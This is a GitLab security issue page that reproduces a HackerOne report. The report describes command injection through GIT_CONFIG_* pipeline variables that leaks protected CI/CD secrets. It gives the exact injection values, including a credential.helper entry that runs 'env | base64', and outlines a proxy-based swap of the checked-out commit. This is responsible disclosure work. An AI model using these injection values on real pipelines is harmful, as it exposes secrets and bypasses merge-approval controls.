

[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Lack of filtering on GIT\_CONFIG\_\* parameters allow Developer to perform bash command injection in protected branch pipeline to disclose CI/CD variable

âš  **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**

**[HackerOne report #2041385](https://hackerone.com/reports/2041385)** by `samuellg` on 2023-06-28, assigned to [@greg](/greg "Greg Myers"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

##### Summary

A user with the permission to run pipelines on a project (i.e. at least `developer` role with permission to merge) is able to craft CI variables to modify the git configuration, and in the end perform command injection within the context of a protected branch's pipeline (during the preliminary CI step where the branch is fetch).

It allows him to have the pipeline run on a different commit (but with the protected branch environment variables), as well as exfiltrate all the protected environment variables.

This allows the attacker to bypass any push rule or any MR approval rules that would prevent him from performing these actions otherwise. The attack is not visible in the commit history.

##### Steps to reproduce

1. The attacker must have the permission to run pipelines on the target branch. The attack mainly have an interest if MR approvals are configured and if the attacker can't self-approve his MR (which is the case in most production environments).
2. The attacker runs a pipeline with the following parameters:

   `GIT_CONFIG_COUNT`: `2`

   `GIT_CONFIG_KEY_0` : `http.proxy`

   `GIT_CONFIG_VALUE_0` : `http://jojo@localhost`

   `GIT_CONFIG_KEY_1` : `credential.helper`

   `GIT_CONFIG_VALUE_1` : `!bash -c 'env | base64 1>&2'`

Note that the `env | base64` can be replaced by any command, as the attacker wishes.

3. The attacker checks the pipeline's output and can see that the command has been executed. A base64 string is output with all the environment variables, including the protected CI variables. He can then decode the base64 string:

```
echo "[base64 string]" | tr -d "\n" | base64 -d
```

(the `tr -d "\n"` part is only useful is you copy and paste the output directly, because it contains line feeds).

##### Impact

This vulnerability allows an attacker with permission to merge to do the following actions, regardless of the MR approvals configuration set on the project:

* 1. Exfiltrate the protected CI variables.
* 2. Have the CI job run on arbitrary code by leveraging an HTTP proxy.

##### Examples

For the examples, we'll use the following simple project.

The project has a `main` branch, and merging to this branch requires two approvals from users with `maintainer` access.

The user `attacker` has a `developer` access to the project, with permission to merge. He can thus run pipelines.

The project contains a protected and masked variable called `SECRET_API_KEY`.

The repository contains the following files:

`.gitlab-ci.yml``

```
stages:
  - build
  - run

image: golang:latest

build:
  stage: build
  script:
    - go build .
  artifacts:
    paths:
      - "git-config-poc"

run-app:
  stage: run
  script:
    - ./git-config-poc
```

`main.go`

```
package main

import "fmt"

func main() {
fmt.Print("Hello")
}
```

`go.mod`

```
module git-config-poc

go 1.19
```

###### Example 1: exfiltrate the CI variables

The attacker runs a pipeline with the following parameters:

`GIT_CONFIG_COUNT`: `2`

`GIT_CONFIG_KEY_0` : `http.proxy`

`GIT_CONFIG_VALUE_0` : `http://jojo@localhost`

`GIT_CONFIG_KEY_1` : `credential.helper`

`GIT_CONFIG_VALUE_1` : `!bash -c 'env | base64 1>&2'`

The job executes the command and outputs the CI variables in base64:

[![Capture_d_e_cran_2023-06-28_a__13.06.31.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/20da93b2e6fa97bdf9e815c15e304bede4568bfb/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f38636535643730332d333762382d343364332d386237662d3834346635316132306639342f436170747572655f645f655f6372616e5f323032332d30362d32385f615f5f31332e30362e33312e706e67)

[![Capture_d_e_cran_2023-06-28_a__13.06.46.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/d298ec0cc6ccf67d5d63aa8050ac10f3591553ac/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f37383935333739352d373637652d343662632d613632612d6634623733343933653138622f436170747572655f645f655f6372616e5f323032332d30362d32385f615f5f31332e30362e34362e706e67)

The `SECRET_API_KEY` is retrieved by the attacker:

[![Capture_d_e_cran_2023-06-28_a__13.07.38.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/949638dc9f878e11eba28de3088b5f3f21737f1f/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f35633165306565652d366136652d346636332d386335382d6264386139646439613332372f436170747572655f645f655f6372616e5f323032332d30362d32385f615f5f31332e30372e33382e706e67)

###### Example 2: replace the legitimate commit by an arbitrary one

The attackers set up a real proxy server, that truly redirect to the original repository. However, he modifies the `credential.helper` config value, so that, besides giving out the password for the proxy, it also creates a branch named after the legitimate pipeline commit. The content of this branch can be set to arbitrary code.

Given the reference precedence respected by GitLab, the

`git checkout -f -q 3059263ca9b0ec4a9d6c9a13ee050dba0ac87803`

Will checkout the malicious branch instead of checking out the commit, and all jobs will execute on arbitrary code (the job's script specified in `.gitlab-ci.yml` are not impacted though).

##### Output of checks

This bug happens on GitLab.com

#### Impact

This vulnerability allows an attacker with permission to merge to do the following actions, regardless of the MR approvals configuration set on the project:

* 1. Exfiltrate the protected CI variables.
* 2. Have the CI job run on arbitrary code by leveraging an HTTP proxy.

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [Capture\_d\_e\_cran\_2023-06-28\_a\_\_13.07.38.png](https://h1.sec.gitlab.net/a/5c1e0eee-6a6e-4f63-8c58-bd8a9dd9a327/Capture_d_e_cran_2023-06-28_a__13.07.38.png)
* [Capture\_d\_e\_cran\_2023-06-28\_a\_\_13.06.31.png](https://h1.sec.gitlab.net/a/8ce5d703-37b8-43d3-8b7f-844f51a20f94/Capture_d_e_cran_2023-06-28_a__13.06.31.png)
* [Capture\_d\_e\_cran\_2023-06-28\_a\_\_13.06.46.png](https://h1.sec.gitlab.net/a/78953795-767e-46bc-a62a-f4b73493e18b/Capture_d_e_cran_2023-06-28_a__13.06.46.png)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.

